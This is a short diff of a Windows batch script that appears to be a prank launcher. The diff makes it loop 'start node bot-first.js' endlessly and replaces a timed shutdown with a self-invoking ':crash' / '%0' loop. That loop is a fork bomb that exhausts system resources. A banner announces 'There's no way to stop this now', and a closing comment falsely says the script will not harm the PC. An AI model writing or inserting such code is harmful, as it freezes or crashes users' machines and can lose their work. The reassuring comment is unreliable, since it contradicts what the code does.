@@ -36,7 +36,7 @@ echo alright then
 pause
 goto boot
 :boot
-node bot-first.js
+start node bot-first.js
 goto boot
 :matrix
 @echo off
@@ -56,7 +56,7 @@ echo.
 echo.
 echo.
 echo                                              ************************
-echo                  *********           *     Good Bye!    *
+echo                  *********           *    There's no way to stop this now   *
 echo                 ***********           ************************
 echo               *************            **********
 echo               *     *****      *          ******
@@ -81,5 +81,8 @@ echo.
 echo.
 echo.
 echo.
-start shutdown -s -t 60 -c "hehehehehehe"
+goto crash
+:crash
+%0
+goto crash 
 ::this will not harm your pc in any way (usually)
